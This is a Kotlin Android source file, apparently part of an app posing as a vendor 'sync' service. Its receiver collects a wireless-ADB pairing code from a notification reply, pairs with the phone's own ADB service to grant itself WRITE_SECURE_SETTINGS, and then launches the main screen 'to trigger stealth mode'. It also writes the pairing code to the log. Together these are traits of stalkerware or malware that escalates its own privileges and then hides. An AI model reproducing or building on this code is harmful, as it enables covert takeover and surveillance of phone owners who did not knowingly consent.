package com.vivo.sync

import android.app.NotificationManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import androidx.core.app.RemoteInput

class PairingReceiver : BroadcastReceiver() {

    companion object {
        const val TAG = "PairingReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val remoteInput = RemoteInput.getResultsFromIntent(intent)
        val code = remoteInput?.getCharSequence(SetupActivity.KEY_PAIRING_CODE)?.toString()?.trim()
        
        Log.d(TAG, "Received pairing code: $code")
        
        if (code.isNullOrEmpty() || code.length < 6) {
            Log.e(TAG, "Invalid code: $code")
            return
        }

        // Dismiss notification immediately
        val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        nm.cancel(SetupActivity.NOTIFICATION_ID)

        // Get discovered host/port from SharedPreferences
        val prefs = context.getSharedPreferences("pairing", Context.MODE_PRIVATE)
        val host = prefs.getString("host", "127.0.0.1") ?: "127.0.0.1"
        val port = prefs.getInt("port", -1)

        Log.d(TAG, "Pairing with $host:$port code=$code")

        if (port <= 0) {
            Log.e(TAG, "No valid pairing port found")
            return
        }

        AdbSelfGrant.pairAndGrant(context.applicationContext, host, port, code,
            object : AdbSelfGrant.Callback {
                override fun onStatus(msg: String) {
                    Log.d(TAG, "Status: $msg")
                }
                override fun onSuccess() {
                    Log.d(TAG, "SUCCESS — WRITE_SECURE_SETTINGS granted!")
                    prefs.edit().putBoolean("granted", true).apply()
                    // Directly launch MainActivity to trigger stealth mode
                    val launchIntent = Intent(context, MainActivity::class.java).apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                    }
                    context.startActivity(launchIntent)
                }
                override fun onFailure(error: String) {
                    Log.e(TAG, "FAILED: $error")
                    prefs.edit().putString("last_error", error).apply()
                    context.sendBroadcast(Intent("com.vivo.sync.GRANT_FAILED").setPackage(context.packageName))
                }
            }
        )
    }
}
